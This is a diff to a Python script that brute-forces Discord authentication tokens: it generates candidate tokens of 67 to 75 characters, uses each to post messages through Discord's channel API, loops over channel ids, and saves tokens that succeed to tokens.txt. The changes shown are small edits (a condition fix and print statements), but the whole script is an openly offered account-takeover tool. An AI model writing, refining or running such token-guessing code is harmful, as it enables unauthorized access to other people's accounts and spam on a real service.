@@ -19,9 +19,9 @@ specificchannel = False # Set to true if you want to specify a channel id. If yo
 ##########################
 
 def request(token, message, specificchannel, savetokens):
-    if specificchannel == None:
+    if specificchannel == False:
         savetoken = False
-        for i in range(100000000000000000,99999999999999999999):
+        for i in range(100000000000000000,99999999999999999999): # REALLY, REALLY DAMN SLOW
             channel_id = i
             url = f"https://discord.com/api/channels/{channel_id}/messages"
 
@@ -35,16 +35,19 @@ def request(token, message, specificchannel, savetokens):
             with open("tokens.txt", "a") as f:
                 f.write(f"{token}\n")
             print(f"Found a token: {token}")
+        print("Tested token: ", token)
         return response.status_code
     else:
         channel_id = specificchannel
         url = f"https://discord.com/api/channels/{channel_id}/messages"
         savetoken = False
 
-        headers = {"Authorization": token}
+        headers = {"Authorization": token} 
         payload = {"content": message}
 
         response = requests.post(url, headers=headers, json=payload)
+
+        print("Tested token : ", token)
 
         if response.status_code == 200 and savetokens == True:
             with open("tokens.txt", "a") as f:
@@ -79,6 +82,6 @@ if dont_limit_cpu == False:
     limit_cpu()
 
 for token in brute(67, 75, True, True, True, True, False): #Generally the token is around 70 characters long
-    status = request(token, message, specificchannel, savetokens)
+    request(token, message, specificchannel, savetokens)
 
 print("EVERYTHING IS DONE")
